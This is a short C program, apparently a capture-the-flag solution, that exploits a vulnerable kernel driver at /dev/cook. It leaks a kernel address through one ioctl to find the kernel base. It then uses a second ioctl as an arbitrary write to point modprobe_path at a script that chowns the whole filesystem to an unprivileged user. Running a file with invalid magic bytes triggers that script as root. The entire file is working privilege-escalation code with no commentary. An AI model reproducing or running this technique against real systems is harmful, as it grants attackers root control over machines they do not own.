#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <stdint.h>

int fd;

typedef struct request_t
{
    void *dst;
    void *src;
    
} request;

int main(){

    system("echo -ne '#!/bin/sh\nchown -R blud:blud /' > /home/blud/x");
    system("chmod +x /home/blud/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/blud/y");
    system("chmod +x /home/blud/y");

    fd = open("/dev/cook", O_RDWR);
    
    char half1[0x9] = "/home/bl\0";
    char half2[0x8] = "ud/x";

    request req;
    unsigned long kbase, modprobe;

    req.src = 0xfffffe0000002f48;
    ioctl(fd, 0x6969, &req);

    kbase = (uint64_t)req.dst - 0xe0128e;
    printf("kbase: 0x%lx\n", kbase);
    modprobe = kbase + 0x1852420;
    printf("modprobe: 0x%lx\n", modprobe);
	
    req.dst = modprobe;
    req.src = half1;
    ioctl(fd, 0xfade, &req);    

    req.dst = modprobe+8;
    req.src = half2;
    ioctl(fd, 0xfade, &req);

    execve("./y",0,0);
}
